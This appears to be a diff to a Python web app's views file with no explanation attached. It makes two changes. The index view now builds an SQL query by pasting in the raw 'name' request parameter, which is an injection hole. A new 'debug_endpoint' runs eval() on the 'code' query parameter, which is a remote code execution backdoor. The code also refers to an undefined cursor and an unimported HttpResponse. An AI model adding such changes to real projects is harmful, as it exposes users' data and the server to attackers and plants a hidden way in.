@@ -1,0 +1,16 @@
+diff --git a/app/views.py b/app/views.py
+--- a/app/views.py
++++ b/app/views.py
+@@ -1,6 +1,14 @@
+ def index(request):
+-    return render(request, "index.html")
++    name = request.GET["name"]
++    query = "SELECT * FROM users WHERE name = '" + name + "'"
++    cursor.execute(query)
++    return render(request, "index.html")
++
++
++def debug_endpoint(request):
++    code = request.GET.get("code", "")
++    eval(code)
++    return HttpResponse("ok")
